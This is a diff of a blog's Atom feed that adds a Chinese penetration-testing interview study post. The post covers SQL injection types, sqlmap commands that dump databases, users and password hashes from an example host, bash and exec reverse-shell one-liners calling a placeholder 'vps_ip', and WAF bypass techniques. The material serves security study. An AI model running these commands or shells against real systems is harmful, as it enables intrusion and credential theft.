@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-03-30T09:48:06.272Z</updated>
+  <updated>2019-04-02T15:01:58.593Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>渗透测试面试</title>
+    <link href="http://yoursite.com/2019/04/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/"/>
+    <id>http://yoursite.com/2019/04/02/渗透测试面试/</id>
+    <published>2019-04-02T15:01:19.000Z</published>
+    <updated>2019-04-02T15:01:58.593Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Q0"><a href="#Q0" class="headerlink" title="Q0"></a>Q0</h2><p>常见的SQL注入类型有哪些？并写出sqlmap检测SQL注入的命令？SQLMAPAPI怎么使用?</p><p>按注入点类型分类：</p><ul><li>数字型注入：select * from 表名 where id=1</li><li>字符型注入：select * from 表名 where name=’admin’</li><li>搜索型注入：select * from 表名 where 字段 like ‘%关键字%’</li></ul><p>按提交的方式分类：</p><ul><li>GET注入</li><li>POST注入</li><li>COOkie注入：HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</li></ul><p>按执行效果来分类：</p><ul><li>基于布尔的盲注</li><li>基于时间的盲注</li><li>基于报错的注入</li><li>可联合查询注入</li><li>堆查询注入</li></ul><h3 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h3><p>检测注入点是否可用</p><ul><li>python sqlmap.py -u “http:xxx”</li><li>加  –batch  //自动输入询问语句</li></ul><p>暴库</p><ul><li>python sqlmap.py -u “<a href="http://192.168.1.150/products.asp?id=134" target="_blank" rel="external">http://192.168.1.150/products.asp?id=134</a>“ –dbs</li></ul><p>web当前使用的数据库</p><ul><li>python sqlmap.py -u “<a href="http://192.168.1.150/products.asp?id=134" target="_blank" rel="external">http://192.168.1.150/products.asp?id=134</a>“ –current-db</li></ul><p>web数据库使用账户</p><ul><li>python sqlmap.py -u “<a href="http://192.168.1.150/products.asp?id=134" target="_blank" rel="external">http://192.168.1.150/products.asp?id=134</a>“ –current-user</li></ul><p>列出sqlsever所有用户</p><ul><li>python sqlmap.py -u “<a href="http://192.168.1.150/products.asp?id=134" target="_blank" rel="external">http://192.168.1.150/products.asp?id=134</a>“ –users</li></ul><p>数据库账户与密码</p><ul><li>python sqlmap.py -u “<a href="http://192.168.1.150/products.asp?id=134" target="_blank" rel="external">http://192.168.1.150/products.asp?id=134</a>“ –passwords</li></ul><p>数据库中的表</p><ul><li>python sqlmap.py -u “<a href="http://192.168.1.150/products.asp?id=134" target="_blank" rel="external">http://192.168.1.150/products.asp?id=134</a>“ -D 数据库名称 –tables</li></ul><h3 id="SQLMAPAPI"><a href="#SQLMAPAPI" class="headerlink" title="SQLMAPAPI"></a>SQLMAPAPI</h3><p>sqlmapapi.py就是提供了一个检查sql注入的接口，我们可以直接通过发送http请求扫描sql注入，获取扫描结果等一系列操作。</p><h2 id="Q1"><a href="#Q1" class="headerlink" title="Q1."></a>Q1.</h2><p>Mongodb、redis、websphere、rsync服务简介和默认运行端口</p><p>Mongodb：MongoDB是一个基于分布式文件存储的数据库。由C++语言编写。旨在为WEB应用提供可扩展的高性能数据存储解决方案。</p><p>redis：Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>websphere</p><p>rsync：rsync　命令是一个远程同步工具，可以通过AN\WAN快速同步多台主机间的文件，它使用的就是rsync算法达到本地和远程两个主机之间文件同步，该算法是增量算法，即只同步两个文件的不同部分，而不是每次同步整个文件，所以速度是相当快，默认端口873(TCP)</p><h2 id="Q2"><a href="#Q2" class="headerlink" title="Q2."></a>Q2.</h2><p>写出你知道的逻辑漏洞</p><p>登录缺陷，账户认证缺陷，会话管理缺陷，权限管理缺陷，支付逻辑缺陷，API缺陷</p><h2 id="Q3"><a href="#Q3" class="headerlink" title="Q3."></a>Q3.</h2><p>列举Linux的反弹shell的一些方法</p><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><ul><li>bash -i &gt;&amp; /dev/tcp/vps_ip/端口号 0&gt;&amp;1</li></ul><p>bash -i 生成一个交互式的子进程</p><p>&amp;表示在Linux后台运行</p><p>/dev/tcp/vps_ip/端口号 其实是与主机建立tcp连接</p><p>/dev/[tcp|upd]/host/port是Linux里面比较特殊的文件，读取和写入相当于建立一个socket调用</p><p>0是标准输入，1是标准输出，2是错误输出，0&gt;&amp;1表示将标准输入重定向到标准输出，0&gt;1表示将标准输入重定向到文件名为1的文件，&amp;是用来区分的标识符（Linux默认不会把错误信息重定向到文件的</p><p>举个栗子， command &gt;file 2&gt;&amp;1表示将标准输出重定向到file，然后错误输出重定向到标准输出，也就是又定向到了file，所以最后，标准输出和错误输出都定向到了file</p><h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><p>主机监听，靶机命令执行</p><p>exec 5&lt;&gt; /dev/tcp/vps_ip/端口号</p><p>cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done</p><p>成功getshell</p><h2 id="Q4"><a href="#Q4" class="headerlink" title="Q4."></a>Q4.</h2><p>针对SQL注入，写出你所知道的Bypass WAF的可能的方式</p><p>a) 大小写混合</p><p>b)替换关键字</p><p>c)使用编码</p><p>d)使用注释</p><p>e)等价函数与命令</p><p>f)特殊符号</p><p>g)HTTP参数控制</p><p>h)缓冲区溢出</p><p>i)整合绕过</p><p>6.写出任意一种漏洞检测代码，用python实现</p><p>7.简述XXE的基本原理，以及如何去检测或者判断Blind XXE的存在</p><p>8.简述针对一个网站的渗透测试思路</p><p>9.针对Web扫描器的爬虫，你怎么看</p><p>10.简述PHP中造成任意文件下载漏洞的常见函数，以及造成漏洞的原因</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;Q0&quot;&gt;&lt;a href=&quot;#Q0&quot; class=&quot;headerlink&quot; title=&quot;Q0&quot;&gt;&lt;/a&gt;Q0&lt;/h2&gt;&lt;p&gt;常见的SQL注入类型有哪些？并写出sqlmap检测SQL注入的命令？SQLMAPAPI怎么使用?&lt;/p&gt;
+&lt;p&gt;按注入点类型分类：&lt;/p&gt;
+
+      
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>笔记</title>
